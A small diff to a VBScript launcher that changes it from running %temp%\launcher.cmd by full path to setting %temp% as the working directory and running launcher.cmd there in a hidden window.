@@ -1,6 +1,8 @@
 Set objShell = CreateObject("WScript.Shell")
 
-launcherPath = objShell.ExpandEnvironmentStrings("%temp%\launcher.cmd")
+' Expand and set the working directory to %temp%
+tempPath = objShell.ExpandEnvironmentStrings("%temp%")
+objShell.CurrentDirectory = tempPath
 
-' Run launcher.cmd silently
-objShell.Run Chr(34) & launcherPath & Chr(34), 0, False
+' Run launcher.cmd in the %temp% directory
+objShell.Run "launcher.cmd", 0, False
